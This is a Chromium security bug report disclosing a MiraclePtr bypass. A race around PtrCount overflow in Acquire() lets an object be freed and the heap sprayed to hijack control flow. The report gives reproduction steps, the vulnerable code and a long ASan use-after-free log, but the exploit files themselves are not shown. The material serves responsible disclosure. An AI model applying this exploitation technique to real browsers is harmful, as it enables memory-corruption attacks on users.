# MiraclePtr bypass due to PtrCount overflow

| Field | Value |
|-------|-------|
| **Issue ID** | [340122160](https://issues.chromium.org/issues/340122160) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Unknown |
| **Platforms** | Android, Linux, Mac, Windows, iOS, ChromeOS |
| **Chrome Version** | 124.0.0.0 |
| **Reporter** | ha...@gmail.com |
| **Assignee** | gl...@google.com |
| **Created** | 2024-05-13 |
| **Bounty** | $100,115.00 |

## Description

# Steps to reproduce the problem

1. git apply patch.diff
2. copy uaf111.h and uaf111.cc to content/browser/permissions/
3. compile asan build chromium and release build chromium.
4. python ./copy\_mojojs\_bindings.py src/out/asan
5. python -m SimpleHttpServer
   For asan build chromium to reproduce:
6. rm -rf /tmp/abcd1234;out/asan/chrome --user-data-dir=/tmp/abcd1234 --enable-blink-features=MojoJS <http://localhost:8000/TestUaf.html>
   Then you will see the asan log and the miracle ptr status is: protected.
   For release build version to reproduce:
   6.rm -rf /tmp/abcd1234;out/asan/chrome --user-data-dir=/tmp/abcd1234 --enable-blink-features=MojoJS
7. Use gdb to attach the browser process.
8. Browse the TestUaf.html then you will see the crash log in gdb. The log shows the control flow has been hjacked to 0x4141414141414141.

# Problem Description

In the Acquire function. It adds the refcounted of count\_ in [1] and then check whether the refcounted overflow in [2].
However, Assume we have such a situation:

1. We have a object and it's refcounted is equal to kPtrCountMask.
2. The refcounted add in thread 1 and trigger the overflow.
3. Since the check will not immediatly crash the other thread of the browser. (In my test, other thread will be shut down in nearly 180ms in my computer).
   180ms is too long for computer. We can execute too many codes. Thus we can free the object in thread 2. Now the PtrCount is 0 because the overflow happend, so we can truely free the object.
   Then we can spray the heap and hjack the overflow in thread 2.

PA\_ALWAYS\_INLINE void Acquire() {
CheckCookieIfSupported();

```
CountType old_count = count_.fetch_add(kPtrInc, std::memory_order_relaxed); --------------[1]
// Check overflow.
PA_CHECK((old_count & kPtrCountMask) != kPtrCountMask);  -----------------[2]

```

}

# Additional Comments

Note:
The patch for in\_slot\_metadata.h is just to trigger Ptrcount overflow quickly.
And I implement a mojo interface to test the MiraclePtr in the other patch.

# Summary

MiraclePtr bypass due to PtrCount overflow

# Custom Questions

#### Type of crash:

MiraclePtr Bypass

#### Crash state:

See attachments

#### Reporter credit:

MiraclePtr bypass bug

# Additional Data

Category: Security   

Chrome Channel: Stable   

Regression: N/A

## Timeline

### ha...@gmail.com (2024-05-13)

Steps to reproduce the problem
1.git apply patch.diff
2.copy uaf111.h and uaf111.cc to content/browser/permissions/
3.compile asan build chromium and release build chromium.
4.python ./copy_mojojs_bindings.py src/out/asan
5.python -m SimpleHttpServer

For asan build chromium to reproduce:
6.rm -rf /tmp/abcd1234;out/asan/chrome --user-data-dir=/tmp/abcd1234 --enable-blink-features=MojoJS http://localhost:8000/TestUaf.html Then you will see the asan log and the miracle ptr status is: protected. 

For release build version to reproduce: 
6.rm -rf /tmp/abcd1234;out/asan/chrome --user-data-dir=/tmp/abcd1234 --enable-blink-features=MojoJS
7.Use gdb to attach the browser process.
8.Browse the TestUaf.html then you will see the crash log in gdb. The log shows the control flow has been hjacked to 0x4141414141414141.

### ha...@gmail.com (2024-05-13)

Hello, I can't see the attachments that I upload and now can't upload new attachments. Maybe this is a bug? I upload 7 files before.

### ha...@gmail.com (2024-05-13)

asan.log
=================================================================
==996856==ERROR: AddressSanitizer: heap-use-after-free on address 0x5210012d5500 at pc 0x7eff54770a4c bp 0x7ffc59b409b0 sp 0x7ffc59b409a8
READ of size 1 at 0x5210012d5500 thread T0 (chrome)
    #0 0x7eff54770a4b in base::internal::(anonymous namespace)::CrashImmediatelyOnUseAfterFree(unsigned long) base/memory/raw_ptr_asan_hooks.cc:53:17
    #1 0x7eff54770649 in base::internal::(anonymous namespace)::SafelyUnwrapForDereference(unsigned long) base/memory/raw_ptr_asan_hooks.cc:76:5
    #2 0x7eff504fe97e in UafTarget* base::internal::RawPtrHookableImpl<true>::SafelyUnwrapPtrForDereference<UafTarget>(UafTarget*) base/allocator/partition_allocator/src/partition_alloc/pointers/raw_ptr_hookable_impl.h:84:9
    #3 0x7eff504fe97e in base::raw_ptr<UafTarget, (partition_alloc::internal::RawPtrTraits)0>::GetForDereference() const base/allocator/partition_allocator/src/partition_alloc/pointers/raw_ptr.h:932:12
    #4 0x7eff504fe97e in base::raw_ptr<UafTarget, (partition_alloc::internal::RawPtrTraits)0>::operator->() const base/allocator/partition_allocator/src/partition_alloc/pointers/raw_ptr.h:625:12
    #5 0x7eff504fe97e in UafManager::TriggerUaf() content/browser/permissions/uaf111.cc:39:2
    #6 0x7eff504f6230 in content::PermissionServiceImpl::TestBackupRefPtr(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&) content/browser/permissions/permission_service_impl.cc:245:19
    #7 0x7eff3fbd86e7 in blink::mojom::PermissionServiceStubDispatch::Accept(blink::mojom::PermissionService*, mojo::Message*) gen/third_party/blink/public/mojom/permissions/permission.mojom.cc:2301:13
    #8 0x7eff4c46fb4a in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1021:54
    #9 0x7eff4c484e83 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:48:24
    #10 0x7eff4c474769 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:706:20
    #11 0x7eff4c491f43 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) mojo/public/cpp/bindings/lib/multiplex_router.cc:1096:42
    #12 0x7eff4c490371 in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:710:7
    #13 0x7eff4c484f96 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #14 0x7eff4c45ba81 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:554:49
    #15 0x7eff4c45d590 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:611:14
    #16 0x7eff4c45e2f8 in void base::internal::DecayedFunctorTraits<void (mojo::Connector::*)(), base::WeakPtr<mojo::Connector>&&>::Invoke<void (mojo::Connector::*)(), base::WeakPtr<mojo::Connector> const&>(void (mojo::Connector::*)(), base::WeakPtr<mojo::Connector> const&) base/functional/bind_internal.h:738:12
    #17 0x7eff4c45e2f8 in void base::internal::InvokeHelper<true, base::internal::FunctorTraits<void (mojo::Connector::*&&)(), base::WeakPtr<mojo::Connector>&&>, void, 0ul>::MakeItSo<void (mojo::Connector::*)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector>>>(void (mojo::Connector::*&&)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector>>&&) base/functional/bind_internal.h:954:5
    #18 0x7eff4c45e2f8 in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::*&&)(), base::WeakPtr<mojo::Connector>&&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(), base::WeakPtr<mojo::Connector>>, void ()>::RunImpl<void (mojo::Connector::*)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector>>, 0ul>(void (mojo::Connector::*&&)(), std::__Cr::tuple<base::WeakPtr<mojo::Connector>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/bind_internal.h:1067:14
    #19 0x7eff54899b6a in base::OnceCallback<void ()>::Run() && base/functional/callback.h:156:12
    #20 0x7eff54899b6a in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:203:34
    #21 0x7eff549072ce in void base::TaskAnnotator::RunTask<base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3>(perfetto::StaticString, base::PendingTask&, base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3&&) base/task/common/task_annotator.h:90:5
    #22 0x7eff549072ce in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:473:23
    #23 0x7eff5490636f in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:338:40
    #24 0x7eff54907fc4 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc
    #25 0x7eff54a99f13 in base::MessagePumpGlib::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_glib.cc:694:48
    #26 0x7eff54908c8d in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:641:12
    #27 0x7eff54823002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:134:14
    #28 0x7eff4f969df3 in content::BrowserMainLoop::RunMainMessageLoop() content/browser/browser_main_loop.cc:1104:18
    #29 0x7eff4f971456 in content::BrowserMainRunnerImpl::Run() content/browser/browser_main_runner_impl.cc:159:15
    #30 0x7eff4f961649 in content::BrowserMain(content::MainFunctionParams) content/browser/browser_main.cc:34:28
    #31 0x7eff521a9495 in content::RunBrowserProcessMain(content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:708:10
    #32 0x7eff521ac703 in content::ContentMainRunnerImpl::RunBrowser(content::MainFunctionParams, bool) content/app/content_main_runner_impl.cc:1299:10
    #33 0x7eff521ac0b3 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1144:12
    #34 0x7eff521a6ae0 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:329:36
    #35 0x7eff521a727a in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:342:10
    #36 0x55b99e93e0cb in ChromeMain chrome/app/chrome_main.cc:192:12
    #37 0x7efefbdc9082 in __libc_start_main /build/glibc-e2p3jK/glibc-2.31/csu/../csu/libc-start.c:308:16

0x5210012d5500 is located 0 bytes inside of 4104-byte region [0x5210012d5500,0x5210012d6508)
freed by thread T0 (chrome) here:
    #0 0x55b99e93c18d in operator delete(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_new_delete.cpp:143:3
    #1 0x7eff504fe6ba in std::__Cr::default_delete<UafTarget>::operator()(UafTarget*) const third_party/libc++/src/include/__memory/unique_ptr.h:67:5
    #2 0x7eff504fe6ba in std::__Cr::unique_ptr<UafTarget, std::__Cr::default_delete<UafTarget>>::reset(UafTarget*) third_party/libc++/src/include/__memory/unique_ptr.h:278:7
    #3 0x7eff504fe6ba in UafManager::ResetObject() content/browser/permissions/uaf111.cc:27:12
    #4 0x7eff504f602f in content::PermissionServiceImpl::TestBackupRefPtr(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&) content/browser/permissions/permission_service_impl.cc:237:19
    #5 0x7eff3fbd86e7 in blink::mojom::PermissionServiceStubDispatch::Accept(blink::mojom::PermissionService*, mojo::Message*) gen/third_party/blink/public/mojom/permissions/permission.mojom.cc:2301:13
    #6 0x7eff4c46fb4a in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1021:54
    #7 0x7eff4c484e83 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:48:24
    #8 0x7eff4c474769 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:706:20
    #9 0x7eff4c491f43 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) mojo/public/cpp/bindings/lib/multiplex_router.cc:1096:42
    #10 0x7eff4c490371 in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:710:7
    #11 0x7eff4c484f96 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #12 0x7eff4c45ba81 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:554:49
    #13 0x7eff4c45d590 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:611:14
    #14 0x7eff4c45cfe7 in mojo::Connector::OnHandleReadyInternal(unsigned int) mojo/public/cpp/bindings/lib/connector.cc:444:3
    #15 0x7eff4c45cfe7 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int) mojo/public/cpp/bindings/lib/connector.cc:410:3
    #16 0x7eff4c45f43a in void base::internal::DecayedFunctorTraits<void (mojo::Connector::*)(char const*, unsigned int), mojo::Connector*, char const* const&>::Invoke<void (mojo::Connector::*)(char const*, unsigned int), mojo::Connector*, char const*, unsigned int>(void (mojo::Connector::*)(char const*, unsigned int), mojo::Connector*&&, char const*&&, unsigned int&&) base/functional/bind_internal.h:738:12
    #17 0x7eff4c45f43a in void base::internal::InvokeHelper<false, base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, void, 0ul, 1ul>::MakeItSo<void (mojo::Connector::* const&)(char const*, unsigned int), std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>> const&, unsigned int>(void (mojo::Connector::* const&)(char const*, unsigned int), std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>> const&, unsigned int&&) base/functional/bind_internal.h:930:12
    #18 0x7eff4c45f43a in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::RunImpl<void (mojo::Connector::* const&)(char const*, unsigned int), std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>> const&, 0ul, 1ul>(void (mojo::Connector::* const&)(char const*, unsigned int), std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>> const&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul>, unsigned int&&) base/functional/bind_internal.h:1067:14
    #19 0x7eff4c45f1ae in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int) base/functional/bind_internal.h:987:12
    #20 0x7eff4c45ecfd in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const & base/functional/callback.h:344:12
    #21 0x7eff4c45eab8 in void base::internal::DecayedFunctorTraits<void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>::Invoke<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&>(void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&, unsigned int&&, mojo::HandleSignalsState const&) base/functional/bind_internal.h:671:12
    #22 0x7eff4c45eab8 in void base::internal::InvokeHelper<false, base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, void, 0ul>::MakeItSo<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)>> const&, unsigned int, mojo::HandleSignalsState const&>(void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)>> const&, unsigned int&&, mojo::HandleSignalsState const&) base/functional/bind_internal.h:930:12
    #23 0x7eff4c45eab8 in void base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::RunImpl<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)>> const&, 0ul>(void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::RepeatingCallback<void (unsigned int)>> const&, std::__Cr::integer_sequence<unsigned long, 0ul>, unsigned int&&, mojo::HandleSignalsState const&) base/functional/bind_internal.h:1067:14
    #24 0x7eff4c45eab8 in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&) base/functional/bind_internal.h:987:12
    #25 0x7eff4c3ab285 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const & base/functional/callback.h:344:12
    #26 0x7eff4c3aac45 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple_watcher.cc:278:14
    #27 0x7eff4c3abd2f in void base::internal::DecayedFunctorTraits<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>::Invoke<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher> const&, int, unsigned int, mojo::HandleSignalsState>(void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher> const&, int&&, unsigned int&&, mojo::HandleSignalsState&&) base/functional/bind_internal.h:738:12
    #28 0x7eff4c3abd2f in void base::internal::InvokeHelper<true, base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, void, 0ul, 1ul, 2ul, 3ul>::MakeItSo<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&) base/functional/bind_internal.h:954:5
    #29 0x7eff4c3abd2f in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunImpl<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, 0ul, 1ul, 2ul, 3ul>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul, 2ul, 3ul>) base/functional/bind_internal.h:1067:14
    #30 0x7eff54899b6a in base::OnceCallback<void ()>::Run() && base/functional/callback.h:156:12
    #31 0x7eff54899b6a in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:203:34
    #32 0x7eff549072ce in void base::TaskAnnotator::RunTask<base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3>(perfetto::StaticString, base::PendingTask&, base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3&&) base/task/common/task_annotator.h:90:5
    #33 0x7eff549072ce in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:473:23
    #34 0x7eff5490636f in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:338:40
    #35 0x7eff54907fc4 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc
    #36 0x7eff54a99681 in base::MessagePumpGlib::HandleDispatch() base/message_loop/message_pump_glib.cc:649:46
    #37 0x7eff54a9c6c2 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:274:43
    #38 0x7efefc6c517c in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x5217c) (BuildId: 5aeee8a84d30e8b2dc1b4853af16559f6c51e307)

previously allocated by thread T0 (chrome) here:
    #0 0x55b99e93b92d in operator new(unsigned long) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_new_delete.cpp:86:3
    #1 0x7eff504fe43e in std::__Cr::__unique_if<UafTarget>::__unique_single std::__Cr::make_unique<UafTarget>() third_party/libc++/src/include/__memory/unique_ptr.h:620:26
    #2 0x7eff504fe43e in UafManager::NewObject() content/browser/permissions/uaf111.cc:20:15
    #3 0x7eff504f5edf in content::PermissionServiceImpl::TestBackupRefPtr(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&) content/browser/permissions/permission_service_impl.cc:233:19
    #4 0x7eff3fbd86e7 in blink::mojom::PermissionServiceStubDispatch::Accept(blink::mojom::PermissionService*, mojo::Message*) gen/third_party/blink/public/mojom/permissions/permission.mojom.cc:2301:13
    #5 0x7eff4c46fb4a in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1021:54
    #6 0x7eff4c484e83 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:48:24
    #7 0x7eff4c474769 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:706:20
    #8 0x7eff4c491f43 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) mojo/public/cpp/bindings/lib/multiplex_router.cc:1096:42
    #9 0x7eff4c490371 in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:710:7
    #10 0x7eff4c484f96 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:43:19
    #11 0x7eff4c45ba81 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:554:49
    #12 0x7eff4c45d590 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:611:14
    #13 0x7eff4c45cfe7 in mojo::Connector::OnHandleReadyInternal(unsigned int) mojo/public/cpp/bindings/lib/connector.cc:444:3
    #14 0x7eff4c45cfe7 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int) mojo/public/cpp/bindings/lib/connector.cc:410:3
    #15 0x7eff4c45f43a in void base::internal::DecayedFunctorTraits<void (mojo::Connector::*)(char const*, unsigned int), mojo::Connector*, char const* const&>::Invoke<void (mojo::Connector::*)(char const*, unsigned int), mojo::Connector*, char const*, unsigned int>(void (mojo::Connector::*)(char const*, unsigned int), mojo::Connector*&&, char const*&&, unsigned int&&) base/functional/bind_internal.h:738:12
    #16 0x7eff4c45f43a in void base::internal::InvokeHelper<false, base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, void, 0ul, 1ul>::MakeItSo<void (mojo::Connector::* const&)(char const*, unsigned int), std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>> const&, unsigned int>(void (mojo::Connector::* const&)(char const*, unsigned int), std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>> const&, unsigned int&&) base/functional/bind_internal.h:930:12
    #17 0x7eff4c45f43a in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::RunImpl<void (mojo::Connector::* const&)(char const*, unsigned int), std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>> const&, 0ul, 1ul>(void (mojo::Connector::* const&)(char const*, unsigned int), std::__Cr::tuple<base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>> const&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul>, unsigned int&&) base/functional/bind_internal.h:1067:14
    #18 0x7eff4c45f1ae in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int) base/functional/bind_internal.h:987:12
    #19 0x7eff4c45ecfd in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const & base/functional/callback.h:344:12
